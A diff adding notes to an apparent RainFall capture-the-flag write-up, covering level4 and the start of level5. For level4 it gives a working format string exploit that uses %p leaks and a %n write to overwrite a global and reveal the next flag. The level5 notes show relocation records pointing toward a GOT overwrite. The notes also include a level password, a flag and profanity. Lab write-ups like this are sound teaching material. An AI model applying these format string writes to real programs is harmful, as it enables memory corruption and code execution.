@@ -570,3 +570,49 @@ level3@RainFall:~$ su level4
 Password:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 ## level4
+Holy shit
+```
+mov     eax, dword [m]
+cmp     eax, 0x1025544
+```
+**wtf is that value the fuck**
+
+printf is called in function p, again the m comparison blah blah
+```
+level4@RainFall:~$ objdump -t ./level4
+08049810 g     O .bss   00000004              m
+```
+So, let's find where the address is written
+```
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%p " * 20' | ./level4 
+0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049810 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+```
+so it's the 12 th item
+```
+level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%12\$p'" | ./level4 
+0x8049810
+```
+its content is compared to **0x1025544 = 16930116** since 4 bytes are used for address, then padding is **16930112** long
+```
+python -c "print '\x10\x98\x04\x08' + '%16930112d%12\$n'" | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+## level5
+no call to shell, but function **o** calls system("/bin/sh")
+```
+level5@RainFall:~$ objdump -R ./level5 
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
